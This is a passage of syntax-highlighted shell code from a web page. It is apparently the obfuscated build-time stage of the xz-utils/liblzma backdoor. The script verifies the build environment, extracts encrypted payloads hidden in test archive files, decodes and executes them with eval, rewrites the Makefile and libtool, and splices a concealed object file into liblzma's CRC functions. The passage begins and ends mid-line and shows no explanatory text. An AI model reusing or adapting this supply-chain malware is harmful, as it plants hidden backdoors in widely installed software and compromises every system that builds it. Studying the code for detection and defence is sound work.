class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs bash">P=<span class="hljs-string">&quot;-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections&quot;</span><br>C=<span class="hljs-string">&quot;pic_flag=\&quot; <span class="hljs-variable">$P</span>\&quot;&quot;</span><br>O=<span class="hljs-string">&quot;^pic_flag=\&quot; -fPIC -DPIC\&quot;$&quot;</span><br>R=<span class="hljs-string">&quot;is_arch_extension_supported&quot;</span><br>x=<span class="hljs-string">&quot;__get_cpuid(&quot;</span><br>p=<span class="hljs-string">&quot;good-large_compressed.lzma&quot;</span><br>U=<span class="hljs-string">&quot;bad-3-corrupt_lzma2.xz&quot;</span><br>[ ! $(<span class="hljs-built_in">uname</span>)=<span class="hljs-string">&quot;Linux&quot;</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 0<br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcVq</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -f config.status; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcSS</span><br><span class="hljs-built_in">eval</span> `grep ^LD=\&#x27;\/ config.status`<br><span class="hljs-built_in">eval</span> `grep ^CC=\&#x27; config.status`<br><span class="hljs-built_in">eval</span> `grep ^GCC=\&#x27; config.status`<br><span class="hljs-built_in">eval</span> `grep ^srcdir=\&#x27; config.status`<br><span class="hljs-built_in">eval</span> `grep ^build=\&#x27;x86_64 config.status`<br><span class="hljs-built_in">eval</span> `grep ^enable_shared=\&#x27;<span class="hljs-built_in">yes</span>\&#x27; config.status`<br><span class="hljs-built_in">eval</span> `grep ^enable_static=\&#x27; config.status`<br><span class="hljs-built_in">eval</span> `grep ^gl_path_map=\&#x27; config.status`<br>vs=`grep -broaF <span class="hljs-string">&#x27;~!:_ W&#x27;</span> <span class="hljs-variable">$srcdir</span>/tests/files/ 2&gt;/dev/null`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$vs</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>f1=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$vs</span> | <span class="hljs-built_in">cut</span> -d: -f1`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$f1</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>start=`<span class="hljs-built_in">expr</span> $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$vs</span> | <span class="hljs-built_in">cut</span> -d: -f2) + 7`<br>ve=`grep -broaF <span class="hljs-string">&#x27;|_!&#123; -&#x27;</span> <span class="hljs-variable">$srcdir</span>/tests/files/ 2&gt;/dev/null`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$ve</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>f2=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$ve</span> | <span class="hljs-built_in">cut</span> -d: -f1`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$f2</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>[ ! <span class="hljs-string">&quot;x<span class="hljs-variable">$f2</span>&quot;</span> = <span class="hljs-string">&quot;x<span class="hljs-variable">$f1</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 0<br>[ ! -f <span class="hljs-variable">$f1</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 0<br>end=`<span class="hljs-built_in">expr</span> $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$ve</span> | <span class="hljs-built_in">cut</span> -d: -f2) - <span class="hljs-variable">$start</span>`<br><span class="hljs-built_in">eval</span> `<span class="hljs-built_in">cat</span> <span class="hljs-variable">$f1</span> | <span class="hljs-built_in">tail</span> -c +<span class="hljs-variable">$&#123;start&#125;</span> | <span class="hljs-built_in">head</span> -c +<span class="hljs-variable">$&#123;end&#125;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot;</span> <span class="hljs-string">&quot;\0-\377&quot;</span> | xz -F raw --lzma2 -dc`<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKccj</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&#x27;\[&quot;HAVE_FUNC_ATTRIBUTE_IFUNC&quot;\]=&quot; 1&quot;&#x27;</span> config.status &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&#x27;define HAVE_FUNC_ATTRIBUTE_IFUNC 1&#x27;</span> config.h &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$enable_shared</span>&quot;</span> != <span class="hljs-string">&quot;xyes&quot;</span>;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! (<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$build</span>&quot;</span> | grep -Eq <span class="hljs-string">&quot;^x86_64&quot;</span> &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$build</span>&quot;</span> | grep -Eq <span class="hljs-string">&quot;linux-gnu$&quot;</span> &gt; /dev/null 2&gt;&amp;1);<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>()&quot;</span> <span class="hljs-variable">$srcdir</span>/src/liblzma/check/crc64_fast.c &gt; /dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>()&quot;</span> <span class="hljs-variable">$srcdir</span>/src/liblzma/check/crc32_fast.c &gt; /dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>&quot;</span> <span class="hljs-variable">$srcdir</span>/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$x</span>&quot;</span> <span class="hljs-variable">$srcdir</span>/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$GCC</span>&quot;</span> != <span class="hljs-string">&#x27;xyes&#x27;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$CC</span>&quot;</span> != <span class="hljs-string">&#x27;xgcc&#x27;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>LDv=<span class="hljs-variable">$LD</span><span class="hljs-string">&quot; -v&quot;</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-variable">$LDv</span> 2&gt;&amp;1 | grep -qs <span class="hljs-string">&#x27;GNU ld&#x27;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">test</span> -f <span class="hljs-string">&quot;<span class="hljs-variable">$srcdir</span>/tests/files/<span class="hljs-variable">$p</span>&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">test</span> -f <span class="hljs-string">&quot;<span class="hljs-variable">$srcdir</span>/tests/files/<span class="hljs-variable">$U</span>&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -f <span class="hljs-string">&quot;<span class="hljs-variable">$srcdir</span>/debian/rules&quot;</span> || <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$RPM_ARCH</span>&quot;</span> = <span class="hljs-string">&quot;xx86_64&quot;</span>;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcst</span><br>j=<span class="hljs-string">&quot;^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$j</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>z=<span class="hljs-string">&quot;^am__uninstall_files_from_dir = &#123;&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$z</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>w=<span class="hljs-string">&quot;^am__install_max =&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$w</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>E=<span class="hljs-variable">$z</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$E</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>Q=<span class="hljs-string">&quot;^am__vpath_adj_setup =&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$Q</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>M=<span class="hljs-string">&quot;^am__include = include&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$M</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>L=<span class="hljs-string">&quot;^all: all-recursive$&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$L</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>m=<span class="hljs-string">&quot;^LTLIBRARIES = \$(lib_LTLIBRARIES)&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$m</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>u=<span class="hljs-string">&quot;AM_V_CCLD = \$(am__v_CCLD_\$(V))&quot;</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$u</span>&quot;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$O</span>&quot;</span> libtool &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcTy</span><br>b=<span class="hljs-string">&quot;am__test = <span class="hljs-variable">$U</span>&quot;</span><br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$j</span>/i<span class="hljs-variable">$b</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>d=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$gl_path_map</span> | sed <span class="hljs-string">&#x27;s/\\\/\\\\\\\\/g&#x27;</span>`<br>b=<span class="hljs-string">&quot;am__strip_prefix = <span class="hljs-variable">$d</span>&quot;</span><br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$w</span>/i<span class="hljs-variable">$b</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>b=<span class="hljs-string">&quot;am__dist_setup = \$(am__strip_prefix) | xz -d 2&gt;/dev/null | \$(SHELL)&quot;</span><br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$E</span>/i<span class="hljs-variable">$b</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>b=<span class="hljs-string">&quot;\$(top_srcdir)/tests/files/\$(am__test)&quot;</span><br>s=<span class="hljs-string">&quot;am__test_dir=<span class="hljs-variable">$b</span>&quot;</span><br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$Q</span>/i<span class="hljs-variable">$s</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>h=<span class="hljs-string">&quot;-Wl,--sort-section=name,-X&quot;</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LDFLAGS</span>&quot;</span> | grep -qs -e <span class="hljs-string">&quot;-z,now&quot;</span> -e <span class="hljs-string">&quot;-z -Wl,now&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>h=<span class="hljs-variable">$h</span><span class="hljs-string">&quot;,-z,now&quot;</span><br><span class="hljs-keyword">fi</span><br>j=<span class="hljs-string">&quot;liblzma_la_LDFLAGS += <span class="hljs-variable">$h</span>&quot;</span><br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$L</span>/i<span class="hljs-variable">$j</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>sed -i <span class="hljs-string">&quot;s/<span class="hljs-variable">$O</span>/<span class="hljs-variable">$C</span>/g&quot;</span> libtool || <span class="hljs-literal">true</span><br>k=<span class="hljs-string">&quot;AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))&quot;</span><br>sed -i <span class="hljs-string">&quot;s/<span class="hljs-variable">$u</span>/<span class="hljs-variable">$k</span>/&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br>l=<span class="hljs-string">&quot;LTDEPS=&#x27;\$(lib_LTDEPS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export top_srcdir=&#x27;\$(top_srcdir)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export CC=&#x27;\$(CC)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export DEFS=&#x27;\$(DEFS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export DEFAULT_INCLUDES=&#x27;\$(DEFAULT_INCLUDES)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export INCLUDES=&#x27;\$(INCLUDES)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export liblzma_la_CPPFLAGS=&#x27;\$(liblzma_la_CPPFLAGS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export CPPFLAGS=&#x27;\$(CPPFLAGS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export AM_CFLAGS=&#x27;\$(AM_CFLAGS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export CFLAGS=&#x27;\$(CFLAGS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export AM_V_CCLD=&#x27;\$(am__v_CCLD_\$(V))&#x27;; \\\\\n\</span><br><span class="hljs-string">    export liblzma_la_LINK=&#x27;\$(liblzma_la_LINK)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export libdir=&#x27;\$(libdir)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export liblzma_la_OBJECTS=&#x27;\$(liblzma_la_OBJECTS)&#x27;; \\\\\n\</span><br><span class="hljs-string">    export liblzma_la_LIBADD=&#x27;\$(liblzma_la_LIBADD)&#x27;; \\\\\n\</span><br><span class="hljs-string">sed rpath \$(am__test_dir) | \$(am__dist_setup) &gt;/dev/null 2&gt;&amp;1&quot;</span>;<br>sed -i <span class="hljs-string">&quot;/<span class="hljs-variable">$m</span>/i<span class="hljs-variable">$l</span>&quot;</span> src/liblzma/Makefile || <span class="hljs-literal">true</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcHD</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">elif</span> (<span class="hljs-built_in">test</span> -f .libs/liblzma_la-crc64_fast.o) &amp;&amp; (<span class="hljs-built_in">test</span> -f .libs/liblzma_la-crc32_fast.o); <span class="hljs-keyword">then</span><br>vs=`grep -broaF <span class="hljs-string">&#x27;jV!.^%&#x27;</span> <span class="hljs-variable">$top_srcdir</span>/tests/files/ 2&gt;/dev/null`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$vs</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>f1=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$vs</span> | <span class="hljs-built_in">cut</span> -d: -f1`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$f1</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>start=`<span class="hljs-built_in">expr</span> $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$vs</span> | <span class="hljs-built_in">cut</span> -d: -f2) + 7`<br>ve=`grep -broaF <span class="hljs-string">&#x27;%.R.1Z&#x27;</span> <span class="hljs-variable">$top_srcdir</span>/tests/files/ 2&gt;/dev/null`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$ve</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>f2=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$ve</span> | <span class="hljs-built_in">cut</span> -d: -f1`<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$f2</span>&quot;</span> != <span class="hljs-string">&quot;x&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br>[ ! <span class="hljs-string">&quot;x<span class="hljs-variable">$f2</span>&quot;</span> = <span class="hljs-string">&quot;x<span class="hljs-variable">$f1</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 0<br>[ ! -f <span class="hljs-variable">$f1</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 0<br>end=`<span class="hljs-built_in">expr</span> $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$ve</span> | <span class="hljs-built_in">cut</span> -d: -f2) - <span class="hljs-variable">$start</span>`<br><span class="hljs-built_in">eval</span> `<span class="hljs-built_in">cat</span> <span class="hljs-variable">$f1</span> | <span class="hljs-built_in">tail</span> -c +<span class="hljs-variable">$&#123;start&#125;</span> | <span class="hljs-built_in">head</span> -c +<span class="hljs-variable">$&#123;end&#125;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot;</span> <span class="hljs-string">&quot;\0-\377&quot;</span> | xz -F raw --lzma2 -dc`<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcKQ</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>()&quot;</span> <span class="hljs-variable">$top_srcdir</span>/src/liblzma/check/crc64_fast.c; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>()&quot;</span> <span class="hljs-variable">$top_srcdir</span>/src/liblzma/check/crc32_fast.c; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$R</span>&quot;</span> <span class="hljs-variable">$top_srcdir</span>/src/liblzma/check/crc_x86_clmul.h; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$x</span>&quot;</span> <span class="hljs-variable">$top_srcdir</span>/src/liblzma/check/crc_x86_clmul.h; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! grep -qs <span class="hljs-string">&quot;<span class="hljs-variable">$C</span>&quot;</span> ../../libtool; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">echo</span> <span class="hljs-variable">$liblzma_la_LINK</span> | grep -qs -e <span class="hljs-string">&quot;-z,now&quot;</span> -e <span class="hljs-string">&quot;-z -Wl,now&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$liblzma_la_LINK</span> | grep -qs -e <span class="hljs-string">&quot;lazy&quot;</span> &gt; /dev/null 2&gt;&amp;1;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br>N=0<br>W=0<br>Y=`grep <span class="hljs-string">&quot;dnl Convert it to C string syntax.&quot;</span> <span class="hljs-variable">$top_srcdir</span>/m4/gettext.m4`<br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$zrKcjv</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -z <span class="hljs-string">&quot;<span class="hljs-variable">$Y</span>&quot;</span>; <span class="hljs-keyword">then</span><br>N=0<br>W=88664<br><span class="hljs-keyword">else</span><br>N=88664<br>W=0<br><span class="hljs-keyword">fi</span><br>xz -dc <span class="hljs-variable">$top_srcdir</span>/tests/files/<span class="hljs-variable">$p</span> | <span class="hljs-built_in">eval</span> <span class="hljs-variable">$i</span> | LC_ALL=C sed <span class="hljs-string">&quot;s/\(.\)/\1\n/g&quot;</span> | LC_ALL=C awk <span class="hljs-string">&#x27;BEGIN&#123;FS=&quot;\n&quot;;RS=&quot;\n&quot;;ORS=&quot;&quot;;m=256;for(i=0;i&lt;m;i++)&#123;t[sprintf(&quot;x%c&quot;,i)]=i;c[i]=((i*7)+5)%m;&#125;i=0;j=0;for(l=0;l&lt;8192;l++)&#123;i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;&#125;&#125;&#123;v=t[&quot;x&quot; (NF&lt;1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf &quot;%c&quot;,(v+k)%m&#125;&#x27;</span> | xz -dc --single-stream | ((head -c +<span class="hljs-variable">$N</span> &gt; /dev/null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>) &amp;&amp; head -c +<span class="hljs-variable">$W</span>) &gt; liblzma_la-crc64-fast.o || true<br>if ! test -f liblzma_la-crc64-fast.o; then<br>exit <span class="hljs-number">0</span><br>fi<br>cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true<br>V=&#x27;#endif\n#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) &#123; int success = 1; uint32_t r[4]; success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(<span class="hljs-number">0</span>))-16); const uint32_t ecx_mask = (1 &lt;&lt; <span class="hljs-string">1) | (1</span> &lt;&lt; <span class="hljs-string">9) | (1 &lt;&lt; 19); return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask; &#125;\n#else\n#define _is_arch_extension_supported is_arch_extension_supported&#x27;</span><br><span class="hljs-string">eval $yosA</span><br><span class="hljs-string">if sed &quot;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&quot; $top_srcdir/src/liblzma/check/crc64_fast.c | \</span><br><span class="hljs-string">sed &quot;/include \&quot;crc_x86_clmul.h\&quot;/a \\$V&quot; | \</span><br><span class="hljs-string">sed &quot;1i # 0 \&quot;$top_srcdir/src/liblzma/check/crc64_fast.c\&quot;&quot; 2&gt;/dev/null | \</span><br><span class="hljs-string">$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2&gt;/dev/null; then</span><br><span class="hljs-string">cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true</span><br><span class="hljs-string">eval $BPep</span><br><span class="hljs-string">if sed &quot;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&quot; $top_srcdir/src/liblzma/check/crc32_fast.c | \</span><br><span class="hljs-string">sed &quot;/include \&quot;crc32_arm64.h\&quot;/a \\$V&quot; | 